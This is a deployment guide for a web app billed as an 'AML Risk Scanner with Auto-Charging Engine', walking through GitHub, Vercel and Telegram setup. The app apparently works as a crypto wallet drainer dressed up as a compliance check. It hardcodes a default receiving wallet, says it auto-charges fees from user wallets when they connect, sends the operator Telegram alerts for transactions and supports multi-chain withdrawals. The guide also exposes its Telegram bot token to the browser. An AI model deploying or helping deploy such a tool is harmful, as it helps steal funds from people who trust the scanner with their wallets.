# 🚀 Deploy to New GitHub Repo & Vercel

## ✅ Prerequisites Checklist

Before you start, make sure you have:
- [ ] GitHub account ready
- [ ] Vercel account ready (sign up at https://vercel.com)
- [ ] Service wallet address (or use default: `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f`)
- [ ] Telegram Bot Token from @BotFather (optional but recommended)
- [ ] Telegram Chat ID from @userinfobot (optional but recommended)
- [ ] WalletConnect Project ID (or use default: `ec69905148aaa16f986896374d25cf53`)

---

## 📋 Step-by-Step Deployment Guide

### **Step 1: Create New GitHub Repository**

1. Go to https://github.com/new
2. Fill in the details:
   - **Repository name:** `almriskscan` (or your preferred name)
   - **Description:** `AML Risk Scanner with Auto-Charging Engine`
   - **Visibility:** Choose Public or Private
   - **DO NOT** initialize with README, .gitignore, or license
3. Click **"Create repository"**

### **Step 2: Push to Your New GitHub Repository**

Open your terminal in this project folder and run:

```bash
# Remove old remote (if exists)
git remote remove origin

# Add your new GitHub repository as remote
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git

# Push to the new repository
git branch -M main
git push -u origin main
```

**Replace:**
- `YOUR_USERNAME` with your GitHub username
- `YOUR_REPO_NAME` with your repository name

**Example:**
```bash
git remote add origin https://github.com/johndoe/almriskscan.git
git branch -M main
git push -u origin main
```

### **Step 3: Deploy to Vercel**

#### 3.1 Import Project to Vercel

1. Go to https://vercel.com/dashboard
2. Click **"Add New..."** → **"Project"**
3. Under **"Import Git Repository"**, click **"Import"** next to your GitHub repository
4. If you don't see your repo:
   - Click **"Adjust GitHub App Permissions"**
   - Grant access to your repository

#### 3.2 Configure Project Settings

On the import page, configure:

- **Framework Preset:** Next.js (should auto-detect)
- **Root Directory:** `apps/web` ⚠️ **IMPORTANT**
- **Build Command:** `npm run build` (should auto-fill)
- **Output Directory:** `.next` (should auto-fill)
- **Install Command:** `npm install` (should auto-fill)

#### 3.3 Add Environment Variables

Click on **"Environment Variables"** section and add these:

| Variable Name | Value | Notes |
|--------------|-------|-------|
| `NEXT_PUBLIC_SERVICE_WALLET` | `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f` | Your service wallet |
| `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` | `ec69905148aaa16f986896374d25cf53` | Get from https://cloud.walletconnect.com |
| `TELEGRAM_BOT_TOKEN` | Your bot token | From @BotFather |
| `TELEGRAM_CHAT_ID` | Your chat ID | From @userinfobot |
| `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` | Same as TELEGRAM_BOT_TOKEN | Public version |
| `NEXT_PUBLIC_TELEGRAM_CHAT_ID` | Same as TELEGRAM_CHAT_ID | Public version |

**For each variable:**
- Select all environments: **Production**, **Preview**, **Development**

#### 3.4 Deploy

1. Click **"Deploy"** button
2. Wait 2-5 minutes for deployment
3. Once complete, you'll get a URL like: `https://your-project.vercel.app`

---

## 🔧 Getting Telegram Credentials (Optional)

### Get Telegram Bot Token:
1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create your bot
4. Copy the token provided

### Get Telegram Chat ID:
1. Send a message to your bot
2. Search for `@userinfobot` in Telegram
3. Start the bot and it will show your chat ID

---

## 🔧 Getting WalletConnect Project ID (Optional)

1. Go to https://cloud.walletconnect.com
2. Sign up or log in
3. Create a new project
4. Copy the Project ID

---

## ✅ Post-Deployment Checklist

After deployment, verify:

- [ ] Visit your Vercel URL and confirm the app loads
- [ ] Try connecting a wallet (MetaMask, WalletConnect, etc.)
- [ ] Check that AML risk scanning works when connecting
- [ ] Verify Telegram notifications arrive (if configured)
- [ ] Test a small transaction on a testnet first

---

## 🔍 Troubleshooting

### Build Fails on Vercel?
- Check that Root Directory is set to `apps/web`
- Verify all environment variables are set correctly
- Check build logs for specific errors

### Wallet Connection Not Working?
- Verify `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` is set
- Make sure the environment variable starts with `NEXT_PUBLIC_`

### Telegram Notifications Not Working?
- Verify both `TELEGRAM_BOT_TOKEN` and `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` are set
- Check that Chat ID is correct
- Test by sending a message to your bot first

### AML Risk Scanner Not Working?
- Check browser console for errors
- Verify wallet connection is successful first
- Ensure you're connected to a supported network

---

## 📞 Support

If you encounter issues:
1. Check Vercel deployment logs
2. Review browser console for errors
3. Verify all environment variables are correctly set

---

## 🎉 Success!

Once deployed, your AML Risk Scanner will:
- ✅ Scan wallets for AML risk when users connect
- ✅ Auto-charge service fees from user wallets
- ✅ Send Telegram notifications for transactions
- ✅ Support multi-chain withdrawals
- ✅ Work with multiple wallet providers

**Your app is now live!** 🚀
